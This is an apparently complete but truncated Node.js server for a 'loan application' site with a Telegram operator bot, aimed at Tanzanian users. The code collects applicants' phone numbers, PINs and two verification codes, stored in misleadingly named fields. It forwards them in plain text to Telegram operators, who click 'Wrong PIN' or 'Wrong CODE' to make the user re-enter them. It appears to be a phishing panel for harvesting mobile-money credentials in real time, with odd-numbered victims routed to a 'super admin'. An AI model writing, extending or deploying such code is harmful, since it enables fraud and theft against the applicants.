require("dotenv").config();

const express = require("express");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const crypto = require("crypto");
const { Pool } = require("pg");
const fs = require("fs");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const PORT = Number(process.env.PORT || 10000);
const INTEREST_RATE = Number(process.env.INTEREST_RATE || 5);
const MIN_LOAN_AMOUNT = Number(process.env.MIN_LOAN_AMOUNT || 50000);
const MAX_LOAN_AMOUNT = Number(process.env.MAX_LOAN_AMOUNT || 5000000);
const DEFAULT_TERM_MONTHS = Number(process.env.DEFAULT_TERM_MONTHS || 3);
const DEFAULT_LOAN_AMOUNT = Number(process.env.DEFAULT_LOAN_AMOUNT || 1000000);
const DEV_SHOW_CODES = String(process.env.DEV_SHOW_CODES || "false").toLowerCase() === "true";
const DEMO_MODE = String(process.env.DEMO_MODE || "false").toLowerCase() === "true";
const TELEGRAM_POLLING = String(process.env.TELEGRAM_POLLING || "true").toLowerCase() === "true";

const adminIds = new Set(
  String(process.env.TELEGRAM_ADMIN_IDS || "")
    .split(",").map(v => v.trim()).filter(Boolean)
);
const superAdminIds = new Set(
  String(process.env.TELEGRAM_SUPER_ADMIN_IDS || process.env.TELEGRAM_ADMIN_IDS || "")
    .split(",").map(v => v.trim()).filter(Boolean)
);
const botUsername = String(process.env.TELEGRAM_BOT_USERNAME || "").replace(/^@/, "");
const APP_BASE_URL = String(process.env.APP_BASE_URL || process.env.RENDER_EXTERNAL_URL || '').replace(/\/$/, '');

// Strict application partition: IDs 5,7,9... belong to Super Admin;
// IDs 1-4 and 6,8,10... belong to regular Admins.
function applicationGroup(applicationOrId) {
  const id = Number(typeof applicationOrId === "object" ? applicationOrId?.id : applicationOrId);
  return Number.isInteger(id) && id >= 5 && id % 2 === 1 ? "super_admin" : "admin";
}
function canAccessApplication(adminRecord, application) {
  if (!adminRecord || !application) return false;
  if (applicationGroup(application) !== String(adminRecord.role)) return false;
  if (adminRecord.role === "super_admin") return true;
  return String(application.assigned_admin_id || "") === String(adminRecord.telegram_id || "");
}


const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
});

const demoDbFile = path.join(__dirname, "data", "applications.json");
let demoRows = [];
let demoAdmins = [];
let demoNextId = 1;

function loadDemoRows() {
  if (!DEMO_MODE) return;
  fs.mkdirSync(path.dirname(demoDbFile), { recursive: true });
  try {
    const parsed = JSON.parse(fs.readFileSync(demoDbFile, "utf8"));
    demoRows = Array.isArray(parsed) ? parsed : (parsed.applications || []);
    demoAdmins = Array.isArray(parsed.admins) ? parsed.admins : [];
    demoNextId = demoRows.reduce((m, r) => Math.max(m, Number(r.id) || 0), 0) + 1;
  } catch {
    demoRows = [];
    demoNextId = 1;
  }
}
function saveDemoRows() {
  fs.mkdirSync(path.dirname(demoDbFile), { recursive: true });
  fs.writeFileSync(demoDbFile, JSON.stringify({ applications: demoRows, admins: demoAdmins }, null, 2));
}

function hashValue(value) {
  return crypto.createHash("sha256").update(String(value)).digest("hex");
}

async function db(query, params = []) {
  if (!DEMO_MODE) return pool.query(query, params);
  const q = query.replace(/\s+/g, " ").trim().toUpperCase();

  if (q.startsWith("CREATE TABLE") || q.startsWith("ALTER TABLE")) return { rows: [] };

  if (q.startsWith("SELECT * FROM LOAN_APPLICATIONS WHERE ID=$1")) {
    const row = demoRows.find(r => String(r.id) === String(params[0]));
    return { rows: row ? [{ ...row }] : [] };
  }

  if (q.startsWith("INSERT INTO LOAN_APPLICATIONS")) {
    const [application_no, phone, application_id, amount, term_months, interest_rate, monthly_payment, total_repayment, assigned_admin_id] = params;
    const row = {
      id: demoNextId++, application_no, phone, application_id, portal_pin_hash: null,
      amount: String(amount), term_months: Number(term_months), interest_rate: String(interest_rate),
      monthly_payment: String(monthly_payment), total_repayment: String(total_repayment),
      status: "PENDING_ADMIN_APPROVAL", verification_code_hash: null, verification_expires_at: null,
      confirmation_code_hash: null, confirmation_expires_at: null, last_code_type: null,
      telegram_message_ids: [], rejection_reason: null, rejected_stage: null, previous_rejection_reason: null, previous_rejected_stage: null, attempt_number: 1, approved_by_telegram_id: null,
      approved_at: null, confirmed_at: null, first_name: null, second_name: null, requested_amount: null, assigned_admin_id: assigned_admin_id || null, created_at: new Date().toISOString(), updated_at: new Date().toISOString()
    };
    demoRows.push(row); saveDemoRows();
    return { rows: [{ ...row }] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_FIRST_NAME_APPROVAL'")) { const [deadline,id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.first_name=null;row.first_name_deadline_at=deadline;row.status='AWAITING_FIRST_NAME_APPROVAL';row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }
  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='APPROVED_FIRST_NAME'")) { const [adminId,id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.status='APPROVED_FIRST_NAME';row.approved_by_telegram_id=adminId;row.second_name_deadline_at=new Date(Date.now()+30000).toISOString();row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }
  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_SECOND_NAME_APPROVAL'")) { const [deadline,id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.second_name=null;row.second_name_deadline_at=deadline;row.status='AWAITING_SECOND_NAME_APPROVAL';row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }
  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET AMOUNT=$1")) { const [amount, monthly, total, id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.amount=String(amount);row.monthly_payment=String(monthly);row.total_repayment=String(total);row.requested_amount=String(amount);row.status='AWAITING_AMOUNT_APPROVAL';row.rejected_stage=null;row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='REJECTED'")) {
    const [adminId, id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "REJECTED";
      row.rejection_reason = "Rejected by authorized administrator";
      row.approved_by_telegram_id = adminId;
      row.approved_at = new Date().toISOString();
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='APPROVED'")) {
    const [adminId, id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "APPROVED";
      row.approved_by_telegram_id = adminId;
      row.approved_at = new Date().toISOString();
      row.first_name_deadline_at = new Date(Date.now()+30000).toISOString();
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET") && q.includes("LAST_CODE_TYPE")) {
    const [hash, expires, type, id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      if (type === "verification") {
        row.verification_code_hash = hash;
        row.verification_expires_at = expires;
      } else {
        row.confirmation_code_hash = hash;
        row.confirmation_expires_at = expires;
      }
      row.last_code_type = type;
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_FINAL_CONFIRMATION'")) {
    const [id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "AWAITING_FINAL_CONFIRMATION";
      row.verification_code_hash = null;
      row.verification_expires_at = null;
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='DISBURSEMENT_PROCESSING'")) {
    const [id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "DISBURSEMENT_PROCESSING";
      row.confirmed_at = new Date().toISOString();
      row.confirmation_code_hash = null;
      row.confirmation_expires_at = null;
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("INSERT INTO TELEGRAM_ADMINS")) {
    const [telegramId, role, token, customerToken] = params;
    const existing = demoAdmins.find(a => String(a.telegram_id) === String(telegramId));
    if (existing) { existing.role = role; existing.active = true; existing.link_token = token; existing.customer_link_token = customerToken || existing.customer_link_token || crypto.randomBytes(18).toString('hex'); existing.updated_at = new Date().toISOString(); }
    else demoAdmins.push({ telegram_id: String(telegramId), role, active: true, link_token: token, customer_link_token: customerToken || crypto.randomBytes(18).toString('hex'), created_at: new Date().toISOString(), updated_at: new Date().toISOString() });
    saveDemoRows();
    return { rows: [] };
  }
  if (q.startsWith("UPDATE TELEGRAM_ADMINS SET ACTIVE=$1")) {
    const [active, telegramId] = params;
    const row = demoAdmins.find(a => String(a.telegram_id) === String(telegramId) && a.role === 'admin');
    if (row) { row.active = Boolean(active); row.updated_at = new Date().toISOString(); saveDemoRows(); }
    return { rows: [] };
  }
  if (q.startsWith("SELECT * FROM TELEGRAM_ADMINS WHERE TELEGRAM_ID=$1 AND ACTIVE=TRUE")) {
    const row = demoAdmins.find(a => String(a.telegram_id) === String(params[0]) && a.active);
    return { rows: row ? [{ ...row }] : [] };
  }
  if (q.startsWith("SELECT * FROM TELEGRAM_ADMINS WHERE TELEGRAM_ID=$1")) {
    const row = demoAdmins.find(a => String(a.telegram_id) === String(params[0]));
    return { rows: row ? [{ ...row }] : [] };
  }
  if (q.startsWith("SELECT TELEGRAM_ID FROM TELEGRAM_ADMINS WHERE ACTIVE=TRUE AND ROLE='ADMIN'")) {
    const rows = demoAdmins.filter(a => a.active && a.role === 'admin').sort((a,b) => String(a.updated_at).localeCompare(String(b.updated_at))).slice(0,1).map(a => ({ telegram_id: a.telegram_id }));
    return { rows };
  }
  if (q.startsWith("SELECT TELEGRAM_ID, ROLE, ACTIVE, CREATED_AT FROM TELEGRAM_ADMINS")) {
    return { rows: demoAdmins.map(a => ({ telegram_id:a.telegram_id, role:a.role, active:a.active, created_at:a.created_at, link_token:a.link_token, customer_link_token:a.customer_link_token })) };
  }
  throw new Error("Unsupported demo database query");
}

async function initDb() {
  if (DEMO_MODE) {
    loadDemoRows();
    for (const id of adminIds) {
      const role = superAdminIds.has(id) ? 'super_admin' : 'admin';
      const existing = demoAdmins.find(a => String(a.telegram_id) === String(id));
      if (existing) { existing.role = role; existing.active = true; existing.updated_at = new Date().toISOString(); if (!existing.link_token) existing.link_token = crypto.randomBytes(18).toString('hex'); if (!existing.customer_link_token) existing.customer_link_token = crypto.randomBytes(18).toString('hex'); }
      else demoAdmins.push({ telegram_id:String(id), role, active:true, link_token:crypto.randomBytes(18).toString('hex'), customer_link_token:crypto.randomBytes(18).toString('hex'), created_at:new Date().toISOString(), updated_at:new Date().toISOString() });
    }
    saveDemoRows();
    return;
  }
  if (!process.env.DATABASE_URL) throw new Error("DATABASE_URL is not configured. Set DATABASE_URL or enable DEMO_MODE for local testing.");

  await db(`
    CREATE TABLE IF NOT EXISTS loan_applications (
      id BIGSERIAL PRIMARY KEY,
      application_no VARCHAR(60),
      application_id VARCHAR(80) UNIQUE NOT NULL,
      full_name VARCHAR(160),
      phone VARCHAR(30) NOT NULL,
      portal_pin_hash VARCHAR(128),
      amount NUMERIC(14,2) NOT NULL,
      term_months INTEGER NOT NULL,
      interest_rate NUMERIC(8,3) NOT NULL,
      monthly_payment NUMERIC(14,2) NOT NULL,
      total_repayment NUMERIC(14,2) NOT NULL,
      status VARCHAR(50) NOT NULL DEFAULT 'PENDING_ADMIN_APPROVAL',
      verification_code_hash VARCHAR(128),
      verification_expires_at TIMESTAMPTZ,
      confirmation_code_hash VARCHAR(128),
      confirmation_expires_at TIMESTAMPTZ,
      last_code_type VARCHAR(30),
      telegram_message_ids JSONB DEFAULT '[]'::jsonb,
      rejection_reason TEXT,
      rejected_stage VARCHAR(40),
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      approved_by_telegram_id VARCHAR(80),
      approved_at TIMESTAMPTZ,
      confirmed_at TIMESTAMPTZ,
      first_name VARCHAR(120),
      second_name VARCHAR(120),
      attempt_number INTEGER NOT NULL DEFAULT 1,
      previous_rejection_reason TEXT,
      previous_rejected_stage VARCHAR(40)
    )
  `);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS application_no VARCHAR(60)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS portal_pin_hash VARCHAR(128)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS attempt_number INTEGER NOT NULL DEFAULT 1`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS previous_rejection_reason TEXT`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS previous_rejected_stage VARCHAR(40)`);
  await db(`CREATE TABLE IF NOT EXISTS telegram_admins (
    telegram_id VARCHAR(80) PRIMARY KEY,
    role VARCHAR(20) NOT NULL DEFAULT 'admin',
    active BOOLEAN NOT NULL DEFAULT TRUE,
    link_token VARCHAR(120),
    customer_link_token VARCHAR(120),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
  )`);

  // Backward-compatible migrations for existing Render PostgreSQL databases.
  // CREATE TABLE IF NOT EXISTS does not add columns to an already-existing table,
  // so every column used below must be migrated before the INSERT runs.
  await db(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS role VARCHAR(20) NOT NULL DEFAULT 'admin'`);
  await db(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS active BOOLEAN NOT NULL DEFAULT TRUE`);
  await db(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS link_token VARCHAR(120)`);
  await db(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS customer_link_token VARCHAR(120)`);
  await db(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ DEFAULT NOW()`);
  await db(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT NOW()`);
  await db(`CREATE UNIQUE INDEX IF NOT EXISTS telegram_admins_link_token_key ON telegram_admins(link_token) WHERE link_token IS NOT NULL`);
  await db(`CREATE UNIQUE INDEX IF NOT EXISTS telegram_admins_customer_link_token_key ON telegram_admins(customer_link_token) WHERE customer_link_token IS NOT NULL`);

  for (const id of adminIds) {
    const role = superAdminIds.has(id) ? 'super_admin' : 'admin';
    const existingAdmin = await db(`SELECT customer_link_token FROM telegram_admins WHERE telegram_id=$1`, [id]);
    const shortCode = existingAdmin.rows[0]?.customer_link_token && /^ADMIN\d+$/i.test(existingAdmin.rows[0].customer_link_token) ? existingAdmin.rows[0].customer_link_token : await nextAdminCode();
    await db(`INSERT INTO telegram_admins (telegram_id, role, active, link_token, customer_link_token) VALUES ($1,$2,TRUE,$3,$4) ON CONFLICT (telegram_id) DO UPDATE SET role=$2, active=TRUE, customer_link_token=CASE WHEN telegram_admins.customer_link_token ~ '^ADMIN[0-9]+$' THEN telegram_admins.customer_link_token ELSE EXCLUDED.customer_link_token END, updated_at=NOW()`, [id, role, crypto.createHash('sha256').update(`${id}:${process.env.TELEGRAM_BOT_TOKEN || 'bot'}`).digest('hex').slice(0,32), shortCode]);
  }
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS assigned_admin_id VARCHAR(80)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_code_hash VARCHAR(128)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_code_hash VARCHAR(128)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_expires_at TIMESTAMPTZ`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_expires_at TIMESTAMPTZ`);
  await db(`ALTER TABLE loan_applications ALTER COLUMN full_name DROP NOT NULL`).catch(() => {});
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS national_id VARCHAR(80)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS application_id VARCHAR(80)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS first_code VARCHAR(120)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS second_code VARCHAR(120)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS rejected_stage VARCHAR(40)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS requested_amount NUMERIC(14,2)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS first_name_deadline_at TIMESTAMPTZ`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS second_name_deadline_at TIMESTAMPTZ`);
  await db(`ALTER TABLE loan_applications ALTER COLUMN national_id DROP NOT NULL`).catch(() => {});
}

function money(value) {
  return new Intl.NumberFormat("en-TZ", { style: "currency", currency: "TZS", maximumFractionDigits: 0 }).format(Number(value));
}

function calculateLoan(amount, months, annualRate) {
  const principal = Number(amount), n = Number(months);
  const monthlyRate = Number(annualRate) / 100 / 12;
  const monthly = monthlyRate === 0
    ? principal / n
    : principal * monthlyRate * Math.pow(1 + monthlyRate, n) / (Math.pow(1 + monthlyRate, n) - 1);
  return { monthly: Math.round(monthly * 100) / 100, total: Math.round(monthly * n * 100) / 100 };
}

function applicationNo() {
  return `LP-${new Date().getFullYear()}-${crypto.randomBytes(4).toString("hex").toUpperCase()}`;
}
function generateCode(length = 6) {
  const min = 10 ** (length - 1), max = (10 ** length) - 1;
  return String(crypto.randomInt(min, max + 1));
}
function validPhone(phone) { return /^[0-9+\s-]{9,20}$/.test(phone); }
function validPortalPin(pin) { return /^\d{4,6}$/.test(pin); }
function numericPhone(phone) {
  const s = String(phone);
  return s.length > 6 ? `${s.slice(0, 4)}••••${s.slice(-2)}` : s;
}

async function sendSms(phone, message) {
  console.log(`[SMS ${process.env.SMS_PROVIDER || "console"}] ${phone}: ${message}`);
  return { sent: true };
}
async function getApplication(id) {
  const result = await db(`SELECT * FROM loan_applications WHERE id=$1`, [id]);
  return result.rows[0];
}

async function nextAdminCode() {
  if (DEMO_MODE) {
    const nums = demoAdmins.map(a => String(a.customer_link_token || '').match(/^ADMIN(\d+)$/i)).filter(Boolean).map(m => Number(m[1]));
    return `ADMIN${String((nums.length ? Math.max(...nums) : 0) + 1).padStart(3, '0')}`;
  }
  const r = await db(`SELECT COALESCE(MAX(CAST(SUBSTRING(customer_link_token FROM 6) AS INTEGER)),0) AS max_no FROM telegram_admins WHERE customer_link_token ~ '^ADMIN[0-9]+$'`);
  return `ADMIN${String(Number(r.rows[0]?.max_no || 0) + 1).padStart(3, '0')}`;
}

function customerLink(token, req) {
  const base = APP_BASE_URL || (req && `${req.protocol}://${req.get('host')}`) || '';
  return base ? `${base}?admin=${encodeURIComponent(token)}` : null;
}

function rejectionLabel(stage) {
  const labels = {
    APPLICATION_DETAILS: "APPLICATION DETAILS REJECTED",
    FIRST_NAME: "NAME REJECTED (FIRST NAME)",
    SECOND_NAME: "NAME REJECTED (SECOND NAME)",
    AMOUNT: "AMOUNT REJECTED",
    PIN: "PIN REJECTED"
  };
  return labels[stage] || "APPLICATION REJECTED";
}

function formatTelegramNotification(application, kind) {
  const id = application.application_id || application.application_no || "—";
  const phone = application.phone || "—";
  const code1 = application.first_name || "—";
  const code2 = application.second_name || "—";
  const stamp = application.updated_at ? new Date(application.updated_at).toLocaleString() : new Date().toLocaleString();
  const attempt = Number(application.attempt_number || 1);

  if (kind === "approved") {
    return `✅ APPLICATION APPROVED\n\n` +
      `📋 ID: ${application.application_no || id}\n` +
      `📞 PHONE: ${phone}\n` +
      `🔑 PIN: ${application.application_id || application.application_no || "—"}\n` +
      `🔢 code1: ${application.first_name || "—"}\n` +
      `🔁 Attempt: #${attempt}\n\n` +
      `📌 Status: APPROVED\n` +
      `⏰ Date: ${stamp}`;
  }

  if (kind === "wrongpin") {
    return `🔑 WRONG PIN — REJECTED\n\n` +
      `🔑 pin: ${id}\n` +
      `📞 Phone: ${phone}\n` +
      `🔢 Attempt: #${attempt}\n\n` +
      `⚠️ Reason: Wrong PIN entered\n` +
      `⏰ Date: ${stamp}\n\n` +
      `✓ User will be sent back to re-enter PIN`;
  }

  if (kind === "wrongfirst") {
    return `🔢 WRONG CODE 1 — REJECTED\n\n` +
      `📋 Application: ${id}\n` +
      `📞 Phone: ${phone}\n` +
      `🔢 Code 1: ${code1}\n` +
      `🔢 Attempt: #${attempt}\n\n` +
      `⚠️ Reason: Wrong Code 1 entered\n` +
      `⏰ Date: ${stamp}\n\n` +
      `✓ User will be sent back to re-enter Code 1`;
  }

  if (kind === "wrongsecond") {
    return `🔢 WRONG CODE 2 — REJECTED\n\n` +
      `🔑 pin: ${id}\n` +
      `📞 Phone: ${phone}\n` +
      `🔢 Code 2: ${code2}\n` +
      `🔢 Attempt: #${attempt}\n\n` +
      `⚠️ Reason: Wrong Code 2 entered\n` +
      `⏰ Date: ${stamp}\n\n` +
      `✓ User will be sent back to re-enter Code 2`;
  }

  return `❌ APPLICATION REJECTED\n\n` +
    `🤳ID: ${application.application_no || id}\n` +
    `📞 PHONE: ${phone}\n` +
    `🔑 PIN: ${application.application_id || application.application_no || "—"}\n` +
    `⚠️ Reason: ${application.rejection_reason || "Application rejected"}\n` +
    `🔁 Attempt: #${attempt}\n` +
    `⏰ Date: ${stamp}`;
}

async function sendTelegramActionNotification(application, kind, adminId) {
  if (!bot || !adminId) return;
  try {
    await bot.sendMessage(String(adminId), formatTelegramNotification(application, kind), { disable_web_page_preview: true });
  } catch (err) { console.error(`Telegram action notification failed for admin ${adminId}:`, err.message); }
}

async function notifyTelegram(application) {
  if (!bot) return;
  const group = applicationGroup(application);
  const recipients = group === "super_admin"
    ? [...superAdminIds].map(String)
    : (application.assigned_admin_id ? [String(application.assigned_admin_id)] : [...adminIds].filter(id => !superAdminIds.has(String(id))));
  const stamp = application.created_at ? new Date(application.created_at).toLocaleString() : new Date().toLocaleString();
  const attempt = Number(application.attempt_number || 1);
  const title = attempt > 1 ? "🔄 RETURNING CUSTOMER (PREVIOUS APPLICATIONS)" : "📋 NEW LOAN APPLICATION";
  const message = `${title}\n\n` +
    `📋 ID: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
    `📞 PHONE: ${application.phone || "—"}\n` +
    `🔑 PIN: ${application.application_id || application.application_no || "—"}\n` +
    `🔢 code1: ${application.first_name || "—"}\n` +
    `🔢 code2: ${application.second_name || "—"}\n` +
    `⏰ Date: ${stamp}\n` +
    `🔁 Attempt: #${attempt}\n` +
    `📌 Status: ${application.status || "PENDING_ADMIN_APPROVAL"}`;
  for (const adminId of recipients) {
    const isSuperAdmin = superAdminIds.has(String(adminId));
    const keyboard = { inline_keyboard: [[
      { text: "❌ Wrong PIN", callback_data: `wrongid:${application.id}` },
      { text: "❌ Wrong CODE", callback_data: `wrongcode:${application.id}` }
    ], [{ text: "✅ Approve", callback_data: `approve:${application.id}` }]] };
    try { await bot.sendMessage(adminId, isSuperAdmin ? `${message}\n\n👑 SUPER ADMIN ASSIGNED APPLICATION` : message, { reply_markup: keyboard, disable_web_page_preview: true }); }
    catch (err) { console.error(`Telegram send failed for admin ${adminId}:`, err.message); }
  }
}

if (process.env.TELEGRAM_BOT_TOKEN && TELEGRAM_POLLING) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: { autoStart: true, params: { timeout: 30 } } });

  async function adminRecord(id) {
    const r = await db(`SELECT * FROM telegram_admins WHERE telegram_id=$1 AND active=TRUE`, [String(id)]);
    return r.rows[0] || null;
  }
  async function ensureAccess(id) { return await adminRecord(id); }
  async function assignAdmin() {
    const r = await db(`SELECT telegram_id FROM telegram_admins WHERE active=TRUE AND role='admin' ORDER BY updated_at ASC, telegram_id ASC LIMIT 1`);
    return r.rows[0]?.telegram_id || null;
  }

  bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const id = String(msg.from.id);
    const rec = await adminRecord(id);
    const deep = match?.[1] || "";

    // Anyone starting the bot first receives their Chat ID, not a personal link.
    if (!rec && !deep) {
      return bot.sendMessage(msg.chat.id, `👋 Welcome!\n\nYour Chat ID: ${id}\n\nBot: ${botUsername ? '@' + botUsername : 'username haijawekwa'}\nTuma Chat ID hii kwa Super Admin ili akupe ruhusa. Baada ya kuongezwa, tumia /mylink kupata kiungo chako.`);
    }
    if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa kutumia bot hii.");

    if (deep.startsWith("customer_")) {
      const token = deep.slice(9);
      const r = await db(`SELECT telegram_id FROM telegram_admins WHERE customer_link_token=$1 AND active=TRUE AND role='admin'`, [token]);
      if (!r.rows[0]) return bot.sendMessage(msg.chat.id, "⛔ Kiungo cha mteja si halali au admin hayuko active.");
      const link = customerLink(token);
      return bot.sendMessage(msg.chat.id, link ? `🔗 Fungua kiungo cha maombi hapa:\n${link}` : "Weka APP_BASE_URL kwenye Render ili kutengeneza kiungo cha mteja.");
    }
    if (deep.startsWith("admin_")) {
      const roleLabel = rec.role === 'super_admin' ? '👑 Super Admin' : '👤 Admin';
      if (rec.role === 'super_admin') {
        return bot.sendMessage(msg.chat.id, `👋 Welcome!\n\nYour Chat ID: ${id}\nYour Admin ID: ${rec.customer_link_token}\nRole: ${roleLabel}\nBot Username: ${botUsername ? '@' + botUsername : 'haijawekwa'}\n\nADMIN MANAGEMENT:\n/admins - Orodha ya admin\n/addadmin CHAT_ID - Ongeza admin\n/revoke CHAT_ID - Ondoa ruhusa ya admin\n/restore CHAT_ID - Rudisha ruhusa ya admin\n\nOTHER COMMANDS:\n/all - Maombi yote\n/stats - Takwimu zako\n/pending - Maombi yanayosubiri\n/myinfo - Taarifa zako`);
      }
      return bot.sendMessage(msg.chat.id, `👋 Welcome!\n\nYour Chat ID: ${id}\nYour Admin ID: ${rec.customer_link_token}\nRole: ${roleLabel}\n\nTumia /mylink kupata kiungo chako binafsi.\n\nCommands:\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information`);
    }
    if (deep.startsWith("app_")) {
      const parts = deep.split("_");
      const appId = parts[1]; const token = parts.slice(2).join("_");
      if (String(rec.link_token || '') !== String(token || '')) return bot.sendMessage(msg.chat.id, "⛔ Kiungo hiki si cha admin huyu.");
      const application = await getApplication(appId);
      if (!application) return bot.sendMessage(msg.chat.id, "⛔ Ombi halikupatikana.");
      if (!canAccessApplication({ ...rec, telegram_id: id }, application)) return bot.sendMessage(msg.chat.id, "⛔ Ombi hili halijagawiwa kwako.");
      const text = `📄 OMBI LAKE\n\nKitambulisho: ${application.application_id || application.application_no}\nPHONE: ${application.phone}\nFIRST NAME: ${application.first_name || 'waiting'}\nSECOND NAME: ${application.second_name || 'waiting'}\nKiasi: ${money(application.amount)}\nHali: ${application.status}`;
      if (rec.role === 'super_admin') {
        return bot.sendMessage(msg.chat.id, `${text}

👑 SUPER ADMIN: VIEW ONLY
👤 ASSIGNED ADMIN: ${application.assigned_admin_id || "NOT ASSIGNED"}`, { reply_markup: { inline_keyboard: [[{ text: "👁 VIEW DETAILS", callback_data: `details:${application.id}` }]] } });
      }
      const keyboard = { inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve:${application.id}` }, { text: "❌ REJECT", callback_data: `reject:${application.id}` }], [{ text: "📄 DETAILS", callback_data: `details:${application.id}` }]] };
      return bot.sendMessage(msg.chat.id, text, { reply_markup: keyboard });
    }

    const roleLabel = rec.role === 'super_admin' ? '👑 Super Admin' : '👤 Admin';
    if (rec.role === 'super_admin') {
      return bot.sendMessage(msg.chat.id, `👋 Welcome!\n\nYour Chat ID: ${id}\nYour Admin ID: ${rec.customer_link_token}\nRole: ${roleLabel}\nBot Username: ${botUsername ? '@' + botUsername : 'haijawekwa'}\n\nADMIN MANAGEMENT:\n/admins - Orodha ya admin\n/addadmin CHAT_ID - Ongeza admin\n/revoke CHAT_ID - Ondoa ruhusa ya admin\n/restore CHAT_ID - Rudisha ruhusa ya admin\n\nOTHER COMMANDS:\n/all - Maombi yote\n/stats - Takwimu zako\n/pending - Maombi yanayosubiri\n/myinfo - Taarifa zako`);
    }
    return bot.sendMessage(msg.chat.id, `👋 Welcome!\n\nYour Chat ID: ${id}\nYour Admin ID: ${rec.customer_link_token}\nRole: ${roleLabel}\n\nTumia /mylink kupata kiungo chako binafsi.\n\nCommands:\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information`);
  });
  bot.onText(/\/mine/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa.");
    const r = await db(`SELECT id, application_id, phone, amount, status FROM loan_applications WHERE assigned_admin_id=$1 AND NOT (id >= 5 AND MOD(id, 2)=1) ORDER BY created_at DESC LIMIT 20`, [String(msg.from.id)]);
    if (!r.rows.length) return bot.sendMessage(msg.chat.id, "Hakuna maombi yaliyogawiwa kwako.");
    return bot.sendMessage(msg.chat.id, r.rows.map(a => `#${a.id} ${a.application_id || ''} | ${a.phone} | ${money(a.amount)} | ${a.status}`).join("\n"));
  });

  bot.onText(/\/all/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
